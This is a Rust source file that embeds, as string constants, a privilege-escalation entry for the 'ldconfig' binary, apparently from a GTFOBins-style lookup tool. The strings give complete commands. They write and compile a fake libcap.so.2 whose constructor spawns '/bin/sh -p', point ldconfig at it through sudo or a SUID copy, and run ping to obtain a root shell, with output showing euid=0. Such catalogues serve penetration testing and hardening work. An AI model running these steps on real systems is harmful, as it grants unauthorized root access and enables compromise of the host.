pub static BIN_NAME: &'static str = "ldconfig";
pub static BIN_DESC_1: &'static str = "Follows a minimal example of how to use the described technique (details may change across different distributions).

Run the code associated with the technique.

Identify a target SUID executable, for example the `libcap` library of `ping`:";
pub static BIN_CODE_1: &'static str = r#"
    
    $ ldd /bin/ping | grep libcap
      libcap.so.2 => /tmp/tmp.9qfoUyKaGu/libcap.so.2 (0x00007fc7e9797000)
"#;
pub static BIN_DESC_2: &'static str = "Create a fake library that spawns a shell at bootstrap:";
pub static BIN_CODE_2: &'static str = r#"
    
    echo '#include <unistd.h>

    __attribute__((constructor))
    static void init() {
        execl("/bin/sh", "/bin/sh", "-p", NULL);
    }
    ' >"$TF/lib.c"
"#;
pub static BIN_DESC_3: &'static str = "Compile it with:";
pub static BIN_CODE_3: &'static str = r#"
    
    gcc -fPIC -shared "$TF/lib.c" -o "$TF/libcap.so.2"
"#;
pub static BIN_DESC_4: &'static str =
    "Run `ldconfig` again as described below then just run `ping` to obtain a root shell:";
pub static BIN_CODE_4: &'static str = r#"
    
    $ ping
    # id
    uid=1000(user) gid=1000(user) euid=0(root) groups=1000(user)
"#;
pub static SUDO_DESC: &'static str = "This allows to override one or more shared libraries. Beware though that it is easy to break target and other binaries.";
pub static SUDO_CODE: &'static str = r#"
    
    TF=$(mktemp -d)
    echo "$TF" > "$TF/conf"
    # move malicious libraries in $TF
    sudo ldconfig -f "$TF/conf"
"#;
pub static LSUID_DESC: &'static str = "This allows to overrid one or more shared libraries. Beware though that it is easy to break target and other binaries.";
pub static LSUID_CODE: &'static str = r#"
    
    sudo install -m =xs $(which ldconfig) .

    TF=$(mktemp -d)
    echo "$TF" > "$TF/conf"
    # move malicious libraries in $TF
    ./ldconfig -f "$TF/conf"
"#;
use crate::code::{Code, Tag};
pub static SUDO: Code<'static> = Code {
    title: "SUDO_CODE",
    code: SUDO_CODE,
    tag: Tag::SUDO,
};
pub static LSUID: Code<'static> = Code {
    title: "LSUID_CODE",
    code: LSUID_CODE,
    tag: Tag::LSUID,
};
